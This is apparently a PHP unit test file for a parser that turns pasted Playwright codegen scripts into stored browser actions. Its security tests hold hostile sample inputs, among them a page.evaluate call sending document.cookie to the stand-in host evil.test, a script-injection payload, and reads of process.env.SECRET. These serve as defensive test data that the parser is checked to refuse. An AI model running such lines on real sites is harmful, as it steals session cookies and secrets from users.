<?php

namespace Tests\Unit\Scraper;

use App\Services\Scraper\CodegenParser;
use App\Services\Scraper\ScdbUrlGuard;
use Tests\TestCase;

class CodegenParserTest extends TestCase
{
    private CodegenParser $parser;

    protected function setUp(): void
    {
        parent::setUp();

        config()->set('scraper.allowed_hosts', ['chiyodanfe.ceccms.com']);
        config()->set('scraper.allowed_schemes', ['https']);

        $this->parser = new CodegenParser(new ScdbUrlGuard);
    }

    public function test_it_converts_a_role_click(): void
    {
        $result = $this->parser->parse("await page.getByRole('link', { name: 'Reports' }).click();");

        $this->assertSame([], $result['unsupported']);
        $this->assertSame([[
            'type' => 'click',
            'locator' => ['strategy' => 'role', 'role' => 'link', 'name' => 'Reports'],
        ]], $result['actions']);
    }

    public function test_it_converts_a_label_select_option(): void
    {
        $result = $this->parser->parse("await page.getByLabel('Train').selectOption('Train-8');");

        $this->assertSame([[
            'type' => 'selectOption',
            'locator' => ['strategy' => 'label', 'label' => 'Train'],
            'value' => 'Train-8',
        ]], $result['actions']);
    }

    public function test_it_converts_a_full_codegen_paste(): void
    {
        $source = <<<'JS'
        import { test, expect } from '@playwright/test';

        test('test', async ({ page }) => {
          await page.goto('https://chiyodanfe.ceccms.com/Reports.aspx');
          await page.getByRole('link', { name: 'Reports' }).click();
          await page.getByText('Loop Index').click();
          await page.getByLabel('Train').selectOption('Train-8');
          await page.getByPlaceholder('Search').fill('L-001');
          await page.waitForLoadState('networkidle');
          await page.getByRole('button', { name: 'Export' }).click();
        });
        JS;

        $result = $this->parser->parse($source);

        $this->assertSame([], $result['unsupported']);
        $this->assertCount(7, $result['actions']);
        $this->assertSame('goto', $result['actions'][0]['type']);
        $this->assertSame('waitForLoadState', $result['actions'][5]['type']);
    }

    public function test_it_handles_double_quotes_and_escapes(): void
    {
        $result = $this->parser->parse('await page.getByText("It\'s here").click();');

        $this->assertSame("It's here", $result['actions'][0]['locator']['text']);
    }

    public function test_it_reads_nth_and_first_refinements(): void
    {
        $result = $this->parser->parse(
            "await page.getByRole('row').nth(2).click();\n".
            "await page.getByText('Export').first().click();"
        );

        $this->assertSame(2, $result['actions'][0]['locator']['nth']);
        $this->assertSame(0, $result['actions'][1]['locator']['nth']);
    }

    /* ---------------------------------------------------------------- *
     * Security: the parser must refuse, never interpret.
     * ---------------------------------------------------------------- */

    public function test_it_refuses_page_evaluate(): void
    {
        $result = $this->parser->parse("await page.evaluate(() => { fetch('https://evil.test/?c=' + document.cookie); });");

        $this->assertSame([], $result['actions']);
        $this->assertCount(1, $result['unsupported']);
        $this->assertStringContainsString('may not run JavaScript', $result['unsupported'][0]['reason']);
    }

    public function test_it_refuses_other_scripting_surfaces(): void
    {
        foreach ([
            "await page.addScriptTag({ content: 'alert(1)' });",
            'await page.addInitScript(() => {});',
            "await page.route('**/*', route => route.abort());",
            "await page.exposeFunction('x', () => {});",
            "await page.\$eval('a', el => el.href);",
        ] as $statement) {
            $result = $this->parser->parse($statement);

            $this->assertSame([], $result['actions'], "Should not convert: {$statement}");
            $this->assertCount(1, $result['unsupported'], "Should flag: {$statement}");
        }
    }

    public function test_it_refuses_a_goto_outside_the_allowlist(): void
    {
        $result = $this->parser->parse("await page.goto('https://evil.test/steal');");

        $this->assertSame([], $result['actions']);
        $this->assertStringContainsString('not an allowed SCDB host', $result['unsupported'][0]['reason']);
    }

    public function test_it_refuses_non_page_statements(): void
    {
        foreach ([
            "const fs = require('fs');",
            "await context.storageState({ path: 'out.json' });",
            'process.exit(1);',
            "await page2.click('#x');",
        ] as $statement) {
            $result = $this->parser->parse($statement);
            $this->assertSame([], $result['actions'], "Should not convert: {$statement}");
        }
    }

    public function test_it_refuses_a_locator_built_from_a_variable_or_regex(): void
    {
        // A regex name cannot be represented in the stored schema, and a
        // variable cannot be resolved without executing the paste.
        $result = $this->parser->parse("await page.getByRole('button', { name: /Export.*/ }).click();");
        $this->assertSame([], $result['actions']);

        $result = $this->parser->parse('await page.getByText(someVariable).click();');
        $this->assertSame([], $result['actions']);
    }

    public function test_it_refuses_playwright_selector_engines_disguised_as_css(): void
    {
        foreach ([
            "await page.locator('text=Export').click();",
            "await page.locator('xpath=//button').click();",
            "await page.locator('#a >> #b').click();",
        ] as $statement) {
            $result = $this->parser->parse($statement);
            $this->assertSame([], $result['actions'], "Should not convert: {$statement}");
        }
    }

    public function test_it_refuses_a_fill_with_a_non_literal_argument(): void
    {
        $result = $this->parser->parse("await page.getByLabel('Search').fill(process.env.SECRET);");

        $this->assertSame([], $result['actions']);
        $this->assertStringContainsString('single plain string argument', $result['unsupported'][0]['reason']);
    }

    public function test_it_refuses_unknown_chained_methods(): void
    {
        $result = $this->parser->parse("await page.getByRole('button').dispatchEvent('click');");

        $this->assertSame([], $result['actions']);
        $this->assertCount(1, $result['unsupported']);
    }

    public function test_it_reports_the_line_number_of_an_unsupported_statement(): void
    {
        $result = $this->parser->parse(
            "await page.getByRole('link', { name: 'Reports' }).click();\n".
            'await page.evaluate(() => 1);'
        );

        $this->assertCount(1, $result['actions']);
        $this->assertSame(2, $result['unsupported'][0]['line']);
    }

    public function test_it_ignores_comments_and_scaffolding(): void
    {
        $result = $this->parser->parse(
            "// click the export button\n".
            "/* block comment */\n".
            "await page.getByRole('button', { name: 'Export' }).click();"
        );

        $this->assertCount(1, $result['actions']);
        $this->assertSame([], $result['unsupported']);
    }
}
